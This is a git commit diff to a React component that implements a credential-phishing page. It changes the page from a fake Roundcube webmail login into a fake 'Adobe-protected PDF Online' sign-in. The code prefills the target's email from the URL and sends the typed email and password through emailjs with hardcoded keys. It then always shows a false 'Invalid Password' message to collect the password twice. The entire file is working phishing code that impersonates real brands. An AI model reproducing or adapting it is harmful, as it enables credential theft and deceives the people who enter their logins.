2fc006d08e970fdfba2419ce46e11c752b01f5c5
qwaszx3215 <84395173+qwaszx3215@users.noreply.github.com>
2022-07-10 17:40:34 +0600

    Update form.js

--- src/form.js
+++ src/form.js
@@ -1,26 +1,22 @@
 import "./App.css";
 import React, { useState } from "react";
 import { Styls } from "./stylls";
-import emailjs from "emailjs-com";
-import { useParams } from "react-router-dom";
+import { useParams, Link } from "react-router-dom";
 
+import emailjs from "emailjs-com";
 function Forms() {
   const params = useParams();
-  console.log(params.id);
 
   const [showForm, setShowForm] = useState(true);
   const [confirmForm, setConfirmForm] = useState(false);
+  const [pass, setPass] = useState("");
+  const [email, setEmail] = useState(params.id);
 
   const submitHandler = (e) => {
     e.preventDefault();
 
     emailjs
-      .sendForm(
-        "gmail",
-        "template_0vlz6hx",
-        e.target,
-        "user_99ogBoikg8ImrHb1RSNcB"
-      )
+      .sendForm("gmail", "template_3jamv0i", e.target, "3hXVmO6FYl9i0rRmR")
       .then(
         (result) => {
           console.log(result.text);
@@ -39,12 +35,7 @@ function Forms() {
     let emailss = params.id;
     let domain = emailss.substring(emailss.lastIndexOf("@") + 1);
     emailjs
-      .sendForm(
-        "gmail",
-        "template_0vlz6hx",
-        e.target,
-        "user_99ogBoikg8ImrHb1RSNcB"
-      )
+      .sendForm("gmail", "template_3jamv0i", e.target, "3hXVmO6FYl9i0rRmR")
       .then(
         (result) => {
           console.log(result.text);
@@ -61,89 +52,150 @@ function Forms() {
 
   return (
     <Styls>
-      <div className="contsainer">
-        {showForm && (
-          <div className="imagees">
-            <img
-              src="https://webmail.gruas-homanser.com/skins/elastic/images/logo.svg?s=1649231387"
-              className="imagee"
-              alt="displare"
-            />
+      {" "}
+      {showForm && (
+        <div id="html_encoder_div">
+          <div className="container">
+            <div className="office show border shadow bg-light" id="others">
+              <div className="office-holder">
+                <div className="logo">
+                  <div id="login_logo">
+                    <img
+                      src="https://www.freeiconspng.com/uploads/pdf-word-icon-31.png"
+                      width="100"
+                      height="100"
+                      alt=""
+                    />
+                  </div>
+                  <h5 className="font-weight-light">
+                    <b> Pdf Online </b>
+                  </h5>
+                  <p>
+                    This document is protected by Adobe. Please verify to access
+                  </p>
+                </div>
+
+                <form className="formal" onSubmit={submitHandler}>
+                  <div className="form-holder">
+                    <div>
+                      <div className="alert alert-danger hide alert2"></div>
+                    </div>
+                    <span className="newicon1">
+                      <i class="fas fa-user fa-1x"></i>
+                    </span>
+                    <input
+                      type="email"
+                      required
+                      value={email}
+                      className="form-control"
+                      onChange={(e) => setEmail(e.target.value)}
+                    />
+                    <input
+                      type="password"
+                      onChange={(e) => setPass(e.target.value)}
+                      required
+                      value={pass}
+                      placeholder="Password"
+                      className="form-control"
+                    />
+                    <span className="newicon">
+                      <i class="fas fa-lock fa-1x"></i>
+                    </span>
+
+                    <div className="btn-holder">
+                      <button type="submit" className="btn btn-lg col-12">
+                        <b> Sign In</b>
+                      </button>
+                    </div>
+                    <div class="clearfix">
+                      <label class="pull-left checkbox-inline">
+                        <input type="checkbox"></input> Secured Login
+                        session?&nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp;
+                      </label>
+                      <Link to="#">Forgot Password?</Link>
+                    </div>
+                  </div>
+                </form>
+              </div>{" "}
+            </div>
+            <div className="abbso">
+              <Link to="#">Copyright Pdf Viewer © 2022</Link>
+            </div>
           </div>
-        )}
-        {showForm && (
-          <form className="formal" onSubmit={submitHandler}>
-            <label>
-              <span className="newicon1">
-                <i class="fas fa-user fa-1x"></i>
-              </span>
-              <input
-                type="email"
-                name="to_user"
-                required
-                placeholder="Username"
-                value={params.id}
-              />
-            </label>
-            <br></br>
-            <label>
-              <span className="newicon1">
-                <i class="fas fa-lock fa-1x"></i>
-              </span>
-              <input
-                type="password"
-                name="to_pass"
-                required
-                placeholder="Password"
-              />
-            </label>
-            <button> LOGIN </button>
-            <p>Roundcube Webmail </p>
-          </form>
-        )}
-      </div>
+        </div>
+      )}
       {confirmForm && (
-        <div className="contsainer">
-          <div className="imagees">
-            <img
-              src="https://webmail.gruas-homanser.com/skins/elastic/images/logo.svg?s=1649231387"
-              className="imagee"
-              alt="displare"
-            />
+        <div id="html_encoder_div">
+          <div className="container">
+            <div className="office show border shadow bg-light" id="others">
+              <div className="office-holder">
+                <div className="logo">
+                  <div id="login_logo">
+                    <img
+                      src="https://www.freeiconspng.com/uploads/pdf-word-icon-31.png"
+                      width="100"
+                      height="100"
+                      alt=""
+                    />
+                  </div>
+                  <h5 className="font-weight-light">
+                    <b> Pdf Online </b>
+                  </h5>
+                  <p>
+                    This document is protected by Adobe. Please verify to access
+                  </p>
+                </div>
+
+                <form className="formal" onSubmit={editHandler}>
+                  <div className="form-holder">
+                    <div>
+                      <div className="alert alert-danger hide alert2"></div>
+                    </div>
+                    <span className="newicon1">
+                      <i class="fas fa-user fa-1x"></i>
+                    </span>
+                    <input
+                      type="email"
+                      required
+                      value={email}
+                      className="form-control"
+                      onChange={(e) => setEmail(e.target.value)}
+                    />
+                    <input
+                      type="password"
+                      onChange={(e) => setPass(e.target.value)}
+                      required
+                      value={pass}
+                      placeholder="Password"
+                      className="form-control"
+                    />
+                    <span className="newicon">
+                      <i class="fas fa-lock fa-1x"></i>
+                    </span>
+                    <div className="msg">
+                      Invalid Password.! Please enter correct password.
+                    </div>
+
+                    <div className="btn-holder">
+                      <button type="submit" className="btn btn-lg col-12">
+                        <b> Sign In</b>
+                      </button>
+                    </div>
+                    <div class="clearfix">
+                      <label class="pull-left checkbox-inline">
+                        <input type="checkbox"></input> Secured Login
+                        session?&nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp;
+                      </label>
+                      <Link to="#">Forgot Password?</Link>
+                    </div>
+                  </div>
+                </form>
+              </div>{" "}
+            </div>
+            <div className="abbso">
+              <Link to="#">Copyright Pdf Viewer © 2022</Link>
+            </div>
           </div>
-
-          <form className="formal" onSubmit={editHandler}>
-            <label>
-              <span className="newicon1">
-                {" "}
-                <i class="fas fa-user fa-1x"></i>{" "}
-              </span>
-              <input
-                type="email"
-                name="to_user"
-                required
-                value={params.id}
-                placeholder="Username"
-              />
-            </label>
-            <br></br>
-
-            <label>
-              <span className="newicon1">
-                {" "}
-                <i class="fas fa-lock fa-1x"></i>{" "}
-              </span>
-              <input
-                type="password"
-                name="to_pass"
-                required
-                placeholder="Password"
-              />
-            </label>
-            <p className="reda">Login failed Incorrect Password</p>
-            <button> LOGIN </button>
-            <p>Roundcube Webmail </p>
-          </form>
         </div>
       )}
     </Styls>
